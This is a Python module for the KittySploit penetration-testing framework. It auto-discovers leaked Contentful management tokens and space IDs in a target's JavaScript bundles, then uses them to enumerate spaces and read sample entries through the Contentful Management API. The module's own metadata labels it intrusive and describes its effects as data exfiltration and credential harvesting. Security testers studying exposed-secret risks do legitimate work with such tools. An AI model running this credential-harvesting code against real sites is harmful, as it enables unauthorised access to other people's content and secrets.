#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Enumerate Contentful spaces and entries using leaked management tokens."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client
from lib.scanner.http.contentful_probe import enumerate_contentful
from lib.scanner.http.vibe_secrets_probe import collect_vibe_http_bodies, mask_secret


class Module(Auxiliary, Http_client):
    __info__ = {
        "name": "Contentful Management API Enumeration",
        "description": (
            "Uses leaked CFPAT management tokens and space IDs to list Contentful "
            "spaces and sample entries. Auto-discovers credentials from SPA bundles."
        ),
        "author": ["KittySploit Team"],
        "tags": ["contentful", "cms", "headless", "enumeration", "auxiliary", "nocode"],
        "modules": ["scanner/http/vibe_stack_secrets_detect"],
        "agent": {
            "risk": "intrusive",
            "effects": ["network_probe", "data_exfiltration"],
            "expected_requests": 4,
            "reversible": True,
            "approval_required": True,
            "produces": ["credentials", "risk_signals"],
            "cost": 1.1,
            "noise": 0.3,
            "value": 1.2,
        },
    }

    space_id = OptString("", "Contentful space ID", False)
    management_token = OptString("", "Contentful management token (CFPAT-…)", False)
    auto_discover = OptBool(True, "Scrape target assets for Contentful credentials", False)

    def run(self):
        bodies = collect_vibe_http_bodies(self.http_request) if self._to_bool(self.auto_discover) else []
        homepage = next((t for p, t in bodies if p == "/"), "")
        if not homepage and bodies:
            homepage = bodies[0][1]

        self._configure_session()
        verify = self._to_bool(self.verify_ssl)

        findings, creds = enumerate_contentful(
            self.session,
            homepage,
            verify_ssl=verify,
            space_id=str(self.space_id or "").strip(),
            management_token=str(self.management_token or "").strip(),
        )

        ok = [f for f in findings if f.get("ok")]
        if not ok:
            print_error("No Contentful Management API access (set options or enable auto_discover)")
            return False

        for hit in ok:
            print_success(
                f"Contentful space {hit.get('space_id')}: "
                f"{hit.get('space_name') or '?'} — entries accessible={hit.get('entries_accessible')}"
            )
            for title in hit.get("sample_entries") or []:
                print_info(f"  → entry: {title}")

        self.set_info(
            severity="critical",
            reason=f"Contentful Management API enum: {len(ok)} space(s) accessible",
            findings=findings,
            credentials={
                k: mask_secret(v) if "token" in k or "key" in k else v for k, v in creds.items()
            },
        )
        return True
